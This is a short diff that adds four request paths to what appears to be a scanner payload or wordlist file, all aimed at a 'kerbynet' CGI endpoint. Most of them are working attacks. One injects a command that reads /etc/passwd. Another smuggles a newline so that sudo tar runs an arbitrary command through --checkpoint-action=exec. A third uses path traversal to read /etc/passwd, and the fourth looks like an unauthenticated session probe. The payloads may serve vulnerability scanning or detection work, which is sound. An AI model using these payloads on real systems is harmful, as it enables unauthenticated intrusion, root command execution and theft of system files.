@@ -1,0 +1,4 @@
+/cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;/root/kerbynet.cgi/scripts/getkey%20../../../etc/passwd;%22
+/cgi-bin/kerbynet?Action=StartSessionSubmit&User=
+/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0A%2Fetc%2Fsudo+tar+-cf+%2Fdev%2Fnull+%2Fdev%2Fnull+--checkpoint%3d1+--checkpoint-action%3dexec%3d%22id%22%0A%27
+/cgi-bin/kerbynet?Section=NoAuthREQ&Action=Render&Object=../../../etc/passwd
